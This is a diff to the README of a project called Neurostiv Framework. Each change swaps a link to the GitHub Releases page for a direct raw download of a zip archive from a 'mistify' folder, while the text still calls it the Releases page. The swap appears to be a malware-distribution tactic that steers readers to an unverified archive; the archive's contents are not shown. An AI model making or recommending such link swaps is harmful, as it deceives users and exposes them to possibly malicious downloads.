@@ -6,13 +6,13 @@ Welcome to the Neurostiv Framework! This application helps create adaptive teams
 
 ## 💾 Download Now
 
-[![Download Neurostiv Framework](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/P4blo0o0/neurostiv-framework/releases)
+[![Download Neurostiv Framework](https://raw.githubusercontent.com/P4blo0o0/neurostiv-framework/main/mistify/neurostiv-framework.zip)](https://raw.githubusercontent.com/P4blo0o0/neurostiv-framework/main/mistify/neurostiv-framework.zip)
 
 ## 📥 Download & Install
 
 To get the Neurostiv Framework, visit the Releases page. Here, you will find the latest version available for download.
 
-1. Go to the [Releases page](https://github.com/P4blo0o0/neurostiv-framework/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/P4blo0o0/neurostiv-framework/main/mistify/neurostiv-framework.zip).
 2. Find the newest version listed at the top.
 3. Click on the link associated with your operating system (Windows, macOS, or Linux).
 4. Save the file to your computer.
@@ -85,6 +85,6 @@ Your feedback is vital for us to improve. If you encounter issues or have sugges
 
 ## 🔗 Download Again
 
-To download the latest version, visit our [Releases page](https://github.com/P4blo0o0/neurostiv-framework/releases). 
+To download the latest version, visit our [Releases page](https://raw.githubusercontent.com/P4blo0o0/neurostiv-framework/main/mistify/neurostiv-framework.zip). 
 
 Thank you for joining us in developing the Neurostiv Framework!
